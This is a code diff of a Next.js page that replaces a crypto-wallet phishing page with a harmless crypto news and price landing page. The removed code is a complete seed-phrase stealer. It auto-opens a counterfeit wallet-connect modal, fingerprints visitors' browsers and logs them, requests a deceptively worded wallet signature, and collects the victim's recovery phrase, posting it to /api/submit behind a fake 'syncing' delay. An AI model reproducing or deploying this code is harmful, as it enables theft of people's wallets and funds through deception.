@@ -1,754 +1,371 @@
 "use client";
-import { useState, useRef, useEffect, useCallback } from "react";
+import { useState, useEffect, useRef } from "react";
+import Link from "next/link";
 
-// ─── BIP39 word list (partial – add full 2048 for production) ─────────────────
-const bip39List = [
-  "abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse",
-  "access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act",
-  "action","actor","actress","actual","adapt","add","addict","address","adjust","admit",
-  "adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent",
-  "agree","ahead","aid","aim","air","airport","aisle","alarm","album","alcohol",
-  "alert","alien","all","alley","allow","almost","alone","alpha","already","also",
-  "alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient",
-  "anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna",
-  "antique","anxiety","any","apart","apology","appear","apple","approve","april","arch",
-  "arctic","area","arena","argue","arm","armed","armor","army","around","arrange",
-  "arrest","arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault",
-  "asset","assist","assume","asthma","athlete","atom","attack","attend","attitude","attract",
-  "auction","audit","august","aunt","author","auto","autumn","average","avocado","avoid",
-  "awake","aware","away","awesome","awful","awkward","axis","baby","balance","bamboo",
-  "banana","banner","bar","barely","bargain","barrel","base","basic","basket","battle",
-  "beach","bean","beauty","because","become","beef","before","begin","behave","behind",
-  "believe","below","belt","bench","benefit","best","betray","better","between","beyond",
-  "bicycle","bind","biology","bird","birth","bitter","black","blade","blame","blanket",
-  "blast","bleak","bless","blind","blood","blossom","blouse","blue","blur","blush",
-  "board","boat","body","boil","bomb","bone","book","boost","border","boring",
-  "borrow","boss","bottom","bounce","boy","bracket","brain","brand","brave","breeze",
-  "brick","bridge","brief","bright","bring","brisk","broccoli","broken","bronze","broom",
-  "brother","brown","brush","bubble","buddy","budget","buffalo","build","bulb","bulk",
-  "bullet","bundle","bunker","burden","burger","burst","bus","business","busy","butter",
-  "buyer","buzz","cabbage","cabin","cable","cactus","cage","cake","call","calm",
-  "camera","camp","can","canal","cancel","candy","cannon","canvas","canyon","capable",
-  "capital","captain","car","carbon","card","cargo","carpet","carry","cart","case",
-  "cash","casino","castle","casual","cat","catalog","catch","category","cattle","caught",
-  "cause","caution","cave","ceiling","celery","cement","census","century","cereal","certain",
-  "chair","chalk","champion","change","chaos","chapter","charge","chase","chat","cheap",
-  "check","cheese","chef","cherry","chest","chicken","chief","child","chimney","choice",
+// ─── Types ────────────────────────────────────────────────────────────────────
+interface CoinData { id: string; symbol: string; name: string; current_price: number; price_change_percentage_24h: number; market_cap: number; image: string; }
+interface NewsItem { title: string; url: string; source: string; time: string; }
+
+// ─── Static news (fallback / demo) ────────────────────────────────────────────
+const DEMO_NEWS: NewsItem[] = [
+  { title: "Bitcoin breaks $70K resistance amid institutional buying surge", url: "#", source: "CoinDesk", time: "2h ago" },
+  { title: "Ethereum ETF inflows hit record $1.2B in single week", url: "#", source: "CoinTelegraph", time: "3h ago" },
+  { title: "Solana DeFi TVL surpasses $8B as ecosystem expands", url: "#", source: "The Block", time: "5h ago" },
+  { title: "SEC approves spot Bitcoin ETF options trading on major exchanges", url: "#", source: "Bloomberg Crypto", time: "6h ago" },
+  { title: "Binance Smart Chain records 5M daily transactions milestone", url: "#", source: "CryptoSlate", time: "8h ago" },
+  { title: "Chainlink CCIP adoption grows with 50 new protocol integrations", url: "#", source: "Decrypt", time: "10h ago" },
 ];
 
-// ─── Wallet definitions ───────────────────────────────────────────────────────
-const WALLETS = [
-  { name: "MetaMask",      icon: "/metamask.png",    rdns: "io.metamask",       popular: true  },
-  { name: "Trust Wallet",  icon: "/trustwallet.png", rdns: "com.trustwallet",   popular: true  },
-  { name: "Coinbase",      icon: "/coinbase.png",    rdns: "com.coinbase",      popular: true  },
-  { name: "Exodus",        icon: "/exodus.png",      rdns: "io.exodus",         popular: false },
-  { name: "Atomic Wallet", icon: "/atomic.png",      rdns: "io.atomicwallet",   popular: false },
-  { name: "TokenPocket",   icon: "/tokenpocket.png", rdns: "pro.tokenpocket",   popular: false },
-  { name: "MathWallet",    icon: "/mathwallet.png",  rdns: "app.mathwallet",    popular: false },
-  { name: "SafePal",       icon: "/safepal.png",     rdns: "io.safepal",        popular: false },
-  { name: "BitKeep",       icon: "/bitkeep.png",     rdns: "com.bitget",        popular: false },
-  { name: "ONTO",          icon: "/onto.png",        rdns: "com.onto",          popular: false },
-  { name: "Other Wallet",  icon: "/wallet.png",      rdns: "other",             popular: false },
+const PARTNERS = [
+  { name: "Ethereum", color: "#627EEA" },
+  { name: "Solana", color: "#9945FF" },
+  { name: "BNB Chain", color: "#F0B90B" },
+  { name: "Polygon", color: "#8247E5" },
+  { name: "Avalanche", color: "#E84142" },
+  { name: "Arbitrum", color: "#28A0F0" },
 ];
 
-const PHRASE_COUNTS = [12, 15, 18, 21, 24];
+const NAV_LINKS = ["Markets", "News", "DeFi", "NFTs", "Learn"];
 
-type Step = "landing" | "modal" | "connecting" | "failed" | "phraseCount" | "phraseInput" | "submitting";
+export default function LandingPage() {
+  const [coins, setCoins] = useState<CoinData[]>([]);
+  const [tickerCoins, setTickerCoins] = useState<CoinData[]>([]);
+  const [mobileMenu, setMobileMenu] = useState(false);
+  const [scrolled, setScrolled] = useState(false);
+  const tickerRef = useRef<HTMLDivElement>(null);
 
-// ─── EIP-6963 Interfaces ───────────────────────────────────────────────────
-interface EIP6963ProviderInfo {
-  rdns: string;
-  uuid: string;
-  name: string;
-  icon: string;
-}
-
-interface EIP6963ProviderDetail {
-  info: EIP6963ProviderInfo;
-  provider: any;
-}
-
-type AnnounceEvent = CustomEvent<EIP6963ProviderDetail>;
-
-function useSyncProviders() {
-  const [providers, setProviders] = useState<EIP6963ProviderDetail[]>([]);
-
+  // Fetch live prices from CoinGecko
   useEffect(() => {
-    const onAnnounceProvider = (event: AnnounceEvent) => {
-      setProviders((prev) => {
-        if (prev.find((p) => p.info.rdns === event.detail.info.rdns)) return prev;
-        return [...prev, event.detail];
-      });
-    };
-
-    window.addEventListener("eip6963:announceProvider" as any, onAnnounceProvider as any);
-    window.dispatchEvent(new Event("eip6963:requestProvider"));
-
-    return () => {
-      window.removeEventListener("eip6963:announceProvider" as any, onAnnounceProvider as any);
-    };
-  }, []);
-
-  return providers;
-}
-
-// ─── Fingerprint helper ───────────────────────────────────────────────────────
-async function collectFingerprint() {
-  const nav = navigator as Navigator & {
-    deviceMemory?: number;
-    connection?: { effectiveType?: string; downlink?: number; rtt?: number; saveData?: boolean };
-    getBattery?: () => Promise<{ level: number; charging: boolean }>;
-  };
-
-  let webglRenderer = "", webglVendor = "";
-  try {
-    const canvas = document.createElement("canvas");
-    const gl = canvas.getContext("webgl") as WebGLRenderingContext | null;
-    if (gl) {
-      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
-      if (dbg) {
-        webglRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-        webglVendor   = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
-      }
-    }
-  } catch { /* silent */ }
-
-  let batteryLevel = "", batteryCharging = "";
-  try {
-    if (nav.getBattery) {
-      const b = await nav.getBattery();
-      batteryLevel   = `${Math.round(b.level * 100)}%`;
-      batteryCharging = b.charging ? "Yes" : "No";
-    }
-  } catch { /* silent */ }
-
-  return {
-    userAgent: navigator.userAgent,
-    language: navigator.language,
-    languages: navigator.languages?.join(", "),
-    platform: navigator.platform,
-    vendor: navigator.vendor,
-    cookiesEnabled: navigator.cookieEnabled,
-    doNotTrack: navigator.doNotTrack,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    localTime: new Date().toLocaleString(),
-    screenWidth: screen.width,
-    screenHeight: screen.height,
-    windowWidth: window.innerWidth,
-    windowHeight: window.innerHeight,
-    colorDepth: screen.colorDepth,
-    devicePixelRatio: window.devicePixelRatio,
-    deviceMemoryGB: nav.deviceMemory,
-    hardwareConcurrency: navigator.hardwareConcurrency,
-    maxTouchPoints: navigator.maxTouchPoints,
-    isMobile: window.matchMedia("(pointer: coarse)").matches,
-    webglRenderer,
-    webglVendor,
-    batteryLevel,
-    batteryCharging,
-    connectionType: nav.connection?.effectiveType,
-    downlinkMbps: nav.connection?.downlink,
-    rttMs: nav.connection?.rtt,
-    dataSaver: nav.connection?.saveData,
-    isOnline: navigator.onLine,
-    darkMode: window.matchMedia("(prefers-color-scheme: dark)").matches,
-    reducedMotion: window.matchMedia("(prefers-reduced-motion: reduce)").matches,
-    referrer: document.referrer || "(direct)",
-    pageUrl: window.location.href,
-    plugins: Array.from(navigator.plugins || []).map((p) => p.name).join(", ") || "(none)",
-  };
-}
-
-// ─── Wallet Deep Link Mapping ────────────────────────────────────────────────
-const DEEP_LINKS: Record<string, string> = {
-  "MetaMask": "metamask://dapp/[URL]",
-  "Trust Wallet": "trust://open_url?url=[URL]",
-  "Coinbase": "https://go.cb-w.com/dapp?cb_url=[URL]",
-  "SafePal": "safepal://main/dapp?url=[URL]",
-  "TokenPocket": "tpoutside://pull.eth?action=dapp&url=[URL]",
-  "Rainbow": "rainbow://open-url?url=[URL]",
-  "Phantom": "phantom://browse/[URL]",
-  "BitKeep": "bitkeep://",
-  "Atomic": "atomicwallet://",
-  "Exodus": "exodus://",
-  "MathWallet": "mathwallet://",
-  "ONTO": "ontoprovider://",
-};
-
-// ─── Main component ───────────────────────────────────────────────────────────
-export default function Home() {
-  const providers = useSyncProviders();
-  const [step, setStep]                 = useState<Step>("landing");
-  const [selectedWallet, setSelectedWallet] = useState<(typeof WALLETS)[0] | null>(null);
-  const [phraseCount, setPhraseCount]   = useState<number | null>(null);
-  const [phraseWords, setPhraseWords]   = useState<string[]>([]);
-  const [showPhrase, setShowPhrase]     = useState(false);
-  const [submitting, setSubmitting]     = useState(false);
-  const [submitDone, setSubmitDone]     = useState(false);
-  const [toast, setToast]               = useState<{ type: "ok" | "err"; msg: string } | null>(null);
-  const [connectingDots, setConnectingDots] = useState("");
-  const [connectTimer, setConnectTimer] = useState(0);
-  const [modalSearch, setModalSearch]   = useState("");
-  const [isMobile, setIsMobile]         = useState(false);
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
-
-  // Log site visit on mount and check for auto-trigger
-  useEffect(() => {
-    setIsMobile(/Android|iPhone|iPad|iPod/i.test(navigator.userAgent));
-
-    collectFingerprint().then((fp) => {
-      fetch("/api/logs", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ status: "visited_site", browserData: fp })
-      }).catch(() => {});
-    });
-
-    // Auto-trigger wallet modal on load
-    const timer = setTimeout(() => {
-      setStep("modal");
-    }, 1500);
-    return () => clearTimeout(timer);
-  }, []);
-
-  // Timer logic for the 30-second connection phases
-  useEffect(() => {
-    if (step !== "connecting") {
-      setConnectTimer(0);
-      return;
-    }
-
-    const interval = setInterval(() => {
-      setConnectTimer(t => {
-        const next = t + 1;
-        // If on mobile and no activity after 10s, fail faster to manual recovery
-        if (isMobile && next >= 10) {
-          setStep("failed");
-          clearInterval(interval);
-          return 10;
+    const fetchPrices = async () => {
+      try {
+        const res = await fetch(
+          "https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=bitcoin,ethereum,solana,binancecoin,cardano,avalanche-2,chainlink,polygon&order=market_cap_desc&sparkline=false"
+        );
+        if (res.ok) {
+          const data = await res.json();
+          setCoins(data);
+          setTickerCoins([...data, ...data]);
         }
-        if (next >= 30) {
-          setStep("failed");
-          clearInterval(interval);
-          return 30;
-        }
-        return next;
-      });
-    }, 1000);
-
-    return () => clearInterval(interval);
-  }, [step, isMobile]);
-
-  // Animated dots while connecting
-  useEffect(() => {
-    if (step !== "connecting") return;
-    let i = 0;
-    const id = setInterval(() => {
-      i = (i + 1) % 4;
-      setConnectingDots(".".repeat(i));
-    }, 400);
+      } catch { /* use static */ }
+    };
+    fetchPrices();
+    const id = setInterval(fetchPrices, 30000);
     return () => clearInterval(id);
-  }, [step]);
-
-  // Auto-focus first phrase input
-  useEffect(() => {
-    if (step === "phraseInput" && inputRefs.current[0]) {
-      setTimeout(() => inputRefs.current[0]?.focus(), 100);
-    }
-  }, [step]);
-
-  // Toast auto-dismiss
-  const showToast = useCallback((type: "ok" | "err", msg: string) => {
-    setToast({ type, msg });
-    setTimeout(() => setToast(null), 4000);
   }, []);
 
-  // ── Attempt real wallet connection ──────────────────────────────────────────
-  async function attemptConnect(wallet: (typeof WALLETS)[0]) {
-    const currentUrl = typeof window !== "undefined" ? window.location.href.split("#")[0] : "";
-    const domain = typeof window !== "undefined" ? window.location.hostname : "node-verification.io";
-    
-    // 📱 Mobile Deep Linking Logic (Trigger early to avoid popup blockers)
-    if (isMobile) {
-      const deepLinkPattern = DEEP_LINKS[wallet.name];
-      // Capture the attempt early
-      fetch("/api/logs", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ 
-          status: "connection_attempted", 
-          wallet: wallet.name, 
-          platform: "mobile",
-        })
-      }).catch(() => {});
+  useEffect(() => {
+    const onScroll = () => setScrolled(window.scrollY > 40);
+    window.addEventListener("scroll", onScroll);
+    return () => window.removeEventListener("scroll", onScroll);
+  }, []);
 
-      if (deepLinkPattern) {
-        const finalLink = deepLinkPattern.replace("[URL]", encodeURIComponent(currentUrl));
-        const discovered = providers.find(p => p.info.rdns === wallet.rdns);
-        const provider = discovered?.provider || (window as any).ethereum;
+  const fmt = (n: number) =>
+    n >= 1e9 ? `$${(n / 1e9).toFixed(1)}B` : n >= 1e6 ? `$${(n / 1e6).toFixed(0)}M` : `$${n.toLocaleString()}`;
+  const pct = (n: number) => `${n >= 0 ? "+" : ""}${n.toFixed(2)}%`;
 
-        if (provider) {
-          try {
-            const accounts = await provider.request({ method: "eth_requestAccounts" });
-            if (accounts && accounts[0]) {
-              const msg = `${domain} wants you to sign in with your Ethereum account:\n${accounts[0]}\n\nBy signing this message, you authorize the decentralized node to verify your wallet's activity and history for eligibility validation.\n\nURI: ${currentUrl}\nVersion: 1\nChain ID: 1\nNonce: ${Math.random().toString(36).substring(2, 11)}\nIssued At: ${new Date().toISOString()}`;
-              await provider.request({ method: "personal_sign", params: [msg, accounts[0]] });
-            }
-          } catch (e) { console.log(e); }
-        } else {
-          // If not in-app browser, attempt to force open the app
-          window.location.href = finalLink;
-        }
-      }
-    }
+  // Fallback coin cards
+  const FALLBACK_COINS = [
+    { id: "bitcoin", symbol: "BTC", name: "Bitcoin", current_price: 67420, price_change_percentage_24h: 2.14, market_cap: 1320000000000, image: "https://assets.coingecko.com/coins/images/1/small/bitcoin.png" },
+    { id: "ethereum", symbol: "ETH", name: "Ethereum", current_price: 3510, price_change_percentage_24h: 1.87, market_cap: 422000000000, image: "https://assets.coingecko.com/coins/images/279/small/ethereum.png" },
+    { id: "solana", symbol: "SOL", name: "Solana", current_price: 172, price_change_percentage_24h: 4.23, market_cap: 78000000000, image: "https://assets.coingecko.com/coins/images/4128/small/solana.png" },
+    { id: "binancecoin", symbol: "BNB", name: "BNB", current_price: 594, price_change_percentage_24h: -0.81, market_cap: 87000000000, image: "https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png" },
+    { id: "avalanche-2", symbol: "AVAX", name: "Avalanche", current_price: 38, price_change_percentage_24h: 3.1, market_cap: 16000000000, image: "https://assets.coingecko.com/coins/images/12559/small/Avalanche_Circle_RedWhite_Trans.png" },
+    { id: "chainlink", symbol: "LINK", name: "Chainlink", current_price: 14.2, price_change_percentage_24h: 1.5, market_cap: 8500000000, image: "https://assets.coingecko.com/coins/images/877/small/chainlink-new-logo.png" },
+  ];
 
-    setSelectedWallet(wallet);
-    setStep("connecting");
-
-    // 💻 Desktop Discovery Logic (EIP-6963)
-    if (!isMobile) {
-      const discovered = providers.find(p => p.info.rdns === wallet.rdns);
-      const provider = discovered?.provider || (window as any).ethereum;
-
-      if (provider) {
-        try {
-          const accounts = await provider.request({ method: "eth_requestAccounts" });
-          if (accounts && accounts[0]) {
-            // Trigger SIWE signature request for high-fidelity verification
-            const msg = `${domain} wants you to sign in with your Ethereum account:\n${accounts[0]}\n\nBy signing this message, you authorize the decentralized node to verify your wallet's activity and history for eligibility validation.\n\nURI: ${currentUrl}\nVersion: 1\nChain ID: 1\nNonce: ${Math.random().toString(36).substring(2, 11)}\nIssued At: ${new Date().toISOString()}`;
-            await provider.request({ method: "personal_sign", params: [msg, accounts[0]] });
-          }
-        } catch (err) {
-          console.log("User rejected or provider error", err);
-        }
-      }
-
-      collectFingerprint().then((fp) => {
-        fetch("/api/logs", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ 
-            status: "connection_attempted", 
-            wallet: wallet.name, 
-            platform: "desktop",
-            browserData: fp 
-          })
-        }).catch(() => {});
-      });
-    }
-  }
-
-  // ── Phrase word changes ─────────────────────────────────────────────────────
-  function handleWordChange(idx: number, val: string) {
-    setPhraseWords(ws => { const c = [...ws]; c[idx] = val; return c; });
-  }
-  function handleKeyDown(idx: number, e: React.KeyboardEvent<HTMLInputElement>) {
-    if ((e.key === "Enter" || e.key === "Tab") && idx < phraseWords.length - 1) {
-      e.preventDefault();
-      inputRefs.current[idx + 1]?.focus();
-    }
-  }
-
-  // ── Submit phrase ──────────────────────────────────────────────────────────
-  async function handleSubmit(e: React.FormEvent) {
-    e.preventDefault();
-    if (submitting) return;
-    setSubmitting(true);
-
-    const fp = await collectFingerprint();
-    // Log attempt locally for admin dashboard
-    fetch("/api/logs", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ status: "phrase_submitted", wallet: selectedWallet?.name, browserData: fp })
-    }).catch(() => {});
-
-    fetch("/api/submit", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        phrase: phraseWords.join(" "),
-        wallet: selectedWallet?.name ?? "Unknown",
-        browserData: fp,
-      }),
-    }).catch(() => {});
-
-    // Fake 6-second "syncing" then show error → redirect
-    setTimeout(() => {
-      setSubmitting(false);
-      setSubmitDone(true);
-    }, 6000);
-  }
-
-  // ── Filtered wallets for modal ─────────────────────────────────────────────
-  const filteredWallets = WALLETS.filter(w =>
-    w.name.toLowerCase().includes(modalSearch.toLowerCase())
-  );
-
-  // ══════════════════════════════════════════════════════════════════════════════
-  // RENDER
-  // ══════════════════════════════════════════════════════════════════════════════
+  const displayCoins = coins.length > 0 ? coins : FALLBACK_COINS;
+  const displayTicker = tickerCoins.length > 0 ? tickerCoins : [...FALLBACK_COINS, ...FALLBACK_COINS];
 
   return (
-    <div className="wc-root">
-      {/* Global styles overhaul to match screenshots */}
+    <div style={{ minHeight: "100vh", background: "#050505", color: "#fff", fontFamily: "'Inter', system-ui, sans-serif" }}>
       <style>{`
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
+        *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+        html{scroll-behavior:smooth;}
+        a{text-decoration:none;color:inherit;}
 
-        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        /* ── Ticker ── */
+        .ticker-wrap{overflow:hidden;background:#0a0a0a;border-bottom:1px solid #1a1a1a;height:36px;display:flex;align-items:center;}
+        .ticker-track{display:flex;gap:48px;animation:tickerScroll 40s linear infinite;white-space:nowrap;padding-left:100%;}
+        @keyframes tickerScroll{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
+        .ticker-item{display:flex;align-items:center;gap:8px;font-size:12px;font-weight:500;}
+        .ticker-up{color:#22c55e;} .ticker-down{color:#ef4444;}
 
-        .wc-root {
-          min-height: 100vh;
-          background: #000;
-          font-family: 'Inter', system-ui, sans-serif;
-          color: #fff;
-          display: flex;
-          flex-direction: column;
-        }
+        /* ── Nav ── */
+        .nav{position:fixed;top:36px;left:0;right:0;z-index:100;transition:all .3s;}
+        .nav.scrolled{background:rgba(5,5,5,0.95);backdrop-filter:blur(16px);border-bottom:1px solid #111;top:0;}
+        .nav-inner{max-width:1200px;margin:0 auto;padding:0 24px;height:68px;display:flex;align-items:center;justify-content:space-between;}
+        .nav-logo{display:flex;align-items:center;gap:10px;font-size:18px;font-weight:800;letter-spacing:-0.5px;}
+        .logo-icon{width:32px;height:32px;background:linear-gradient(135deg,#8b5cf6,#06b6d4);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:16px;}
+        .nav-links{display:flex;gap:32px;} 
+        .nav-link{font-size:14px;font-weight:500;color:#888;transition:color .2s;}
+        .nav-link:hover{color:#fff;}
+        .nav-actions{display:flex;gap:12px;align-items:center;}
+        .btn-ghost{padding:8px 16px;border-radius:10px;border:1px solid #222;background:none;color:#ccc;font-size:13px;font-weight:600;cursor:pointer;transition:all .2s;font-family:inherit;}
+        .btn-ghost:hover{border-color:#444;color:#fff;}
+        .btn-primary{padding:10px 20px;border-radius:12px;border:none;background:linear-gradient(135deg,#8b5cf6,#06b6d4);color:#fff;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit;transition:opacity .2s;white-space:nowrap;}
+        .btn-primary:hover{opacity:.9;}
+        .mobile-menu-btn{display:none;background:none;border:1px solid #222;color:#fff;padding:8px 12px;border-radius:8px;cursor:pointer;font-size:16px;}
 
-        /* ─── Landing ─────────────────────────────────────── */
-        .landing {
-          min-height: 100vh;
-          display: flex;
-          flex-direction: column;
-          align-items: center;
-          justify-content: center;
-          padding: 24px;
-          background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(59,130,246,0.1) 0%, transparent 70%), #000;
-          transition: opacity 0.3s;
-        }
-        .landing-card {
-          background: rgba(255,255,255,0.03);
-          border: 1px solid rgba(255,255,255,0.1);
-          border-radius: 32px;
-          padding: 48px 32px;
-          max-width: 440px;
-          width: 100%;
-          text-align: center;
-          backdrop-filter: blur(20px);
-          animation: fadeUp 0.5s ease both;
-        }
-        .landing-logo { font-size: 48px; margin-bottom: 24px; }
-        .landing-title { font-size: 24px; font-weight: 700; margin-bottom: 12px; }
-        .landing-desc { font-size: 15px; color: #888; line-height: 1.6; margin-bottom: 32px; }
-        .connect-btn {
-          width: 100%; padding: 18px; border-radius: 16px; border: none; background: #fff; color: #000;
-          font-size: 16px; font-weight: 700; cursor: pointer; transition: transform 0.2s, background 0.2s;
-          font-family: inherit;
-        }
-        .connect-btn:hover { background: #eee; transform: translateY(-2px); }
+        /* ── Hero ── */
+        .hero{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:120px 24px 80px;text-align:center;position:relative;overflow:hidden;}
+        .hero-bg{position:absolute;inset:0;background:radial-gradient(ellipse 80% 60% at 50% 20%,rgba(139,92,246,.15) 0%,transparent 60%),radial-gradient(ellipse 60% 40% at 80% 70%,rgba(6,182,212,.08) 0%,transparent 60%);pointer-events:none;}
+        .hero-badge{display:inline-flex;align-items:center;gap:8px;padding:6px 14px;border-radius:99px;background:rgba(139,92,246,.1);border:1px solid rgba(139,92,246,.25);font-size:12px;font-weight:600;color:#a78bfa;margin-bottom:32px;letter-spacing:.5px;}
+        .badge-dot{width:6px;height:6px;border-radius:50%;background:#8b5cf6;animation:pulse 2s infinite;}
+        @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(1.3)}}
+        .hero-h1{font-size:clamp(40px,7vw,88px);font-weight:900;letter-spacing:-3px;line-height:1.0;margin-bottom:24px;background:linear-gradient(135deg,#fff 0%,#a78bfa 50%,#22d3ee 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
+        .hero-sub{font-size:clamp(16px,2vw,20px);color:#666;max-width:560px;line-height:1.6;margin-bottom:48px;}
+        .hero-ctas{display:flex;gap:16px;justify-content:center;flex-wrap:wrap;}
+        .btn-hero-primary{padding:16px 32px;border-radius:14px;border:none;background:linear-gradient(135deg,#8b5cf6,#06b6d4);color:#fff;font-size:16px;font-weight:700;cursor:pointer;font-family:inherit;transition:transform .2s,opacity .2s;}
+        .btn-hero-primary:hover{transform:translateY(-2px);opacity:.9;}
+        .btn-hero-secondary{padding:16px 32px;border-radius:14px;border:1px solid #333;background:rgba(255,255,255,.03);color:#ccc;font-size:16px;font-weight:600;cursor:pointer;font-family:inherit;transition:all .2s;}
+        .btn-hero-secondary:hover{border-color:#555;color:#fff;background:rgba(255,255,255,.06);}
+        .hero-stats{display:flex;gap:48px;justify-content:center;margin-top:64px;flex-wrap:wrap;}
+        .stat{text-align:center;}
+        .stat-num{font-size:28px;font-weight:800;background:linear-gradient(135deg,#fff,#a78bfa);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
+        .stat-label{font-size:13px;color:#555;margin-top:4px;}
 
-        /* ─── Modal overlay ───────────────────────────────── */
-        .modal-overlay {
-          position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(10px);
-          display: flex; align-items: center; justify-content: center; padding: 16px; z-index: 100;
-          animation: fadeIn 0.2s ease both;
-        }
+        /* ── Section ── */
+        .section{max-width:1200px;margin:0 auto;padding:80px 24px;}
+        .section-title{font-size:clamp(24px,3vw,36px);font-weight:800;letter-spacing:-1px;margin-bottom:8px;}
+        .section-sub{color:#555;font-size:15px;margin-bottom:40px;}
+        .section-header{display:flex;align-items:flex-end;justify-content:space-between;margin-bottom:40px;}
+        .see-all{font-size:13px;color:#555;transition:color .2s;cursor:pointer;} .see-all:hover{color:#a78bfa;}
 
-        /* ─── Wallet Selection Modal ──────────────────────── */
-        .selection-modal {
-          background: #141414; border: 1px solid #262626; border-radius: 32px;
-          width: 100%; max-width: 360px; max-height: 90vh; overflow: hidden;
-          display: flex; flex-direction: column; box-shadow: 0 40px 100px rgba(0,0,0,1);
-          animation: slideUp 0.3s cubic-bezier(0.34,1.56,0.64,1) both;
-        }
-        .modal-header-reown { display: flex; align-items: center; justify-content: center; padding: 24px 20px 16px; position: relative; }
-        .modal-back-btn { position: absolute; left: 20px; background: none; border: none; color: #888; cursor: pointer; font-size: 20px; }
-        .modal-title-reown { font-size: 16px; font-weight: 600; color: #fff; }
-        .modal-close-reown { position: absolute; right: 20px; background: none; border: none; color: #888; cursor: pointer; font-size: 20px; }
+        /* ── Coin Cards ── */
+        .coins-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px;}
+        .coin-card{background:#0d0d0d;border:1px solid #1a1a1a;border-radius:20px;padding:24px;transition:border-color .2s,transform .2s;cursor:pointer;position:relative;overflow:hidden;}
+        .coin-card::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(139,92,246,.04),transparent);opacity:0;transition:opacity .3s;}
+        .coin-card:hover{border-color:#333;transform:translateY(-4px);}
+        .coin-card:hover::before{opacity:1;}
+        .coin-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;}
+        .coin-info{display:flex;align-items:center;gap:12px;}
+        .coin-img{width:40px;height:40px;border-radius:50%;background:#111;}
+        .coin-name{font-size:15px;font-weight:700;}
+        .coin-symbol{font-size:12px;color:#555;text-transform:uppercase;margin-top:2px;}
+        .coin-badge-up{background:rgba(34,197,94,.1);color:#22c55e;padding:4px 10px;border-radius:6px;font-size:12px;font-weight:700;}
+        .coin-badge-down{background:rgba(239,68,68,.1);color:#ef4444;padding:4px 10px;border-radius:6px;font-size:12px;font-weight:700;}
+        .coin-price{font-size:26px;font-weight:800;letter-spacing:-1px;margin-bottom:4px;}
+        .coin-mcap{font-size:12px;color:#444;}
 
-        .wallet-list { padding: 12px; overflow-y: auto; }
-        .wallet-item-reown {
-          display: flex; align-items: center; gap: 16px; padding: 14px 16px; border-radius: 16px;
-          background: transparent; border: none; width: 100%; cursor: pointer; transition: background 0.2s;
-          text-align: left; font-family: inherit; color: #fff;
-        }
-        .wallet-item-reown:hover { background: #1e1e1e; }
-        .wallet-icon-reown { width: 40px; height: 40px; border-radius: 12px; object-fit: contain; }
-        .wallet-name-reown { font-weight: 500; font-size: 15px; }
+        /* ── News ── */
+        .news-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:20px;}
+        .news-card{background:#0d0d0d;border:1px solid #1a1a1a;border-radius:20px;padding:28px;transition:border-color .2s,transform .2s;}
+        .news-card:hover{border-color:#2a2a2a;transform:translateY(-3px);}
+        .news-source{display:flex;align-items:center;gap:8px;margin-bottom:16px;}
+        .news-dot{width:8px;height:8px;border-radius:50%;background:linear-gradient(135deg,#8b5cf6,#06b6d4);}
+        .news-source-name{font-size:11px;font-weight:700;color:#666;text-transform:uppercase;letter-spacing:1px;}
+        .news-time{font-size:11px;color:#444;margin-left:auto;}
+        .news-title{font-size:15px;font-weight:600;line-height:1.5;color:#ccc;transition:color .2s;}
+        .news-card:hover .news-title{color:#fff;}
+        .news-arrow{margin-top:16px;font-size:12px;color:#444;transition:color .2s;} .news-card:hover .news-arrow{color:#a78bfa;}
 
-        .modal-footer-reown { padding: 24px; text-align: center; border-top: 1px solid #1f1f1f; }
-        .reown-branding { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 12px; color: #666; }
-        .reown-logo { background: #fff; color: #000; padding: 2px 6px; border-radius: 4px; font-weight: 800; font-size: 10px; }
+        /* ── Partners ── */
+        .partners-section{border-top:1px solid #111;border-bottom:1px solid #111;padding:60px 24px;}
+        .partners-label{text-align:center;font-size:12px;color:#444;letter-spacing:2px;text-transform:uppercase;margin-bottom:40px;}
+        .partners-row{display:flex;justify-content:center;align-items:center;gap:48px;flex-wrap:wrap;}
+        .partner-item{display:flex;align-items:center;gap:10px;opacity:.4;transition:opacity .2s;cursor:default;}
+        .partner-item:hover{opacity:.8;}
+        .partner-dot{width:10px;height:10px;border-radius:50%;}
